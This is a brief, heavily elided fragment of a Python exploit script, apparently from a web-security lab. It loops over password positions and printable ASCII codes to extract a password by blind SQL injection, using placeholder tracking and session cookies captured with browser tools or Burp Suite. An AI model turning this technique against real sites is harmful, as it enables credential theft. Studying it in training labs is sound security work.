...
def exploit_sqli_password(url):
    ...
    for i in range(1, num_chars_in_password + 1):
        for j in range(32, 126): # ASCII codes (space to ~ i.e. alphanumeric characters and special characters)
            ...
            trackingIdCookie = "INSERT_COOKIE_HERE" # obtain these two cookies via Network tab, Cookie Editor extension on browser, or Burp Suite proxy intercept
            sessionCookie = "INSERT_COOKIE_HERE"
            cookies = {
